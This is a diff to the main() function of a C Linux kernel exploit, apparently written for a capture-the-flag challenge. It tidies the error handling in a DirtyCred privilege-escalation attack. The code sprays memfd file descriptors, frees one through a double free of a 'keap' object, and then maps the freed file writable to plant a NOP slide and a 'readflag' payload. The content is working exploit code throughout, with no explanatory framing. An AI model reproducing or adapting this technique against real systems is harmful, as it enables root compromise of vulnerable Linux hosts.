@@ -43,7 +43,6 @@ int main(void) {
       keap_ptr = keap_ptrs[i];
     }
   }
-  // spray
 
   /*******************************
    * DIRTY CRED                  *
@@ -54,11 +53,7 @@ int main(void) {
   linfo("Spray FDs");
   int spray_fds[NUM_SPRAY_FDS_1];
   for (int i = 0; i < NUM_SPRAY_FDS_1; i++) {
-    spray_fds[i] = SYSCHK(memfd_create("a", 0)); // /tmp/a is a writable file
-    if (spray_fds[i] == -1) {
-      puts("Failed to open FDs");
-      return EXIT_FAILURE;
-    }
+    spray_fds[i] = SYSCHK(memfd_create("a", 0)); 
   }
 
   linfo("Free one of the FDs via double free keap");
@@ -94,15 +89,14 @@ int main(void) {
   print_hex(buf, FS_CONTEXT_SLAB_SIZE);
 #endif
 
-  if (freed_fd == -1) {
-    puts("Failed to find FD");
-    return EXIT_FAILURE;
-  }
+  if (freed_fd == -1) 
+    lerror("Failed to find FD");
 
   // mmap trick instead of race with write
   lstage("DirtyCred via mmap");
   char *file_mmap = mmap(NULL, NOP_SLIDE_SIZE + sizeof(readflag),
                          PROT_READ | PROT_WRITE, MAP_SHARED, freed_fd, 0);
+  CHK(file_mmap != MAP_FAILED);
   // After: 3 fd 2 refcount (Because new file)
 
   SYSCHK(close(freed_fd));
